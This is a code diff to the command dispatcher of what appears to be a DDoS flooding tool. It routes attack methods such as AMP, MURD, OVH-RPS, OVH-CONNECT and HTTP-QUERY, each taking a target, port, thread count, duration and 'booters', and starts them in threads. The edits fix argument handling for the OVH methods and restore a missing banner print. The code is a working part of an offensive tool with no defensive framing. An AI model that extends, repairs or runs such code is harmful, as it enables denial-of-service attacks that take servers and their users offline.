@@ -50,13 +50,13 @@ def handle_attack_command(com, languages, attack_type,mode,more=''):
         elif mode == 5:
            if len(com) == 6:target,port,thread,times,meths = com[1],com[2], com[3], com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
         elif mode == 4:
-           if len(com) == 7:
-            target,port,thread,times,booters,meths = com[1],com[2], com[3], com[4],com[5],com[6]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {booters} {meths}')).start(); a = languages['DISPLAY']['ATTACK'];  print(atk % (a, target, com[0])); c = 1
+           if len(com) == 7:target,port,thread,times,booters,meths = com[1],com[2], com[3], com[4],com[5],com[6]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {booters} {meths}')).start(); a = languages['DISPLAY']['ATTACK'];  print(atk % (a, target, com[0])); c = 1
         elif mode == 3:
            if len(com) == 4:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
         if c == 0:
            a = format_banner(languages['METHODS'][attack_type.replace('-','').replace('_','')])
            if more != '':a = a.replace(attack_type,F'{more}')
+           print(a)
 
 def controler():
     global port_live,port_on,port_keep,c,methods,q
@@ -86,8 +86,12 @@ def controler():
         elif a in ['AMP','أمب','ขยาย']:handle_attack_command(com, languages, 'AMP',2)
         elif a == 'MURD':handle_attack_command(com, languages, 'MURD',3)
         elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURD',3,'MURD-OPT')
-        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:handle_attack_command(com+' NULL', languages, 'OVH-RPS',4)
-        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:handle_attack_command(com+' NULL', languages, 'OVH-CONNECT',4)
+        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:
+           if len(com) != 1 and len(com) != 7:com.append('GET')
+           handle_attack_command(com, languages, 'OVH-RPS',4)
+        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:
+            if len(com) != 1 and len(com) != 7:com.append('GET')
+            handle_attack_command(com, languages, 'OVH-CONNECT',4)
         elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTP-QUERY',4)
         elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
         elif a == 'PAPING':
